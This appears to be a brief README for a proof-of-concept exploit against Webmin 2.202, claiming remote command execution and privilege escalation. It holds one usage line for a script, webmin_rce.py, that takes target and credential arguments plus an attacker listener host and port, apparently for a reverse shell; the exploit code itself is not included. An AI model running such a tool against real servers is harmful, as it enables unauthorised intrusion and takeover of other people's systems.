# Webmin RCE Leading to Privilege Escalation

This vulnerability is found in version 2.202 of the webmin and includes remote command execution and privilege escalation vulnerabilities.

# PoC
 ``` 
 python3 webmin_rce.py -rhost <target> -rport <targetport> -u <user> -p <password> -lhost <attackerip> -lport <listenport>
  ``` 
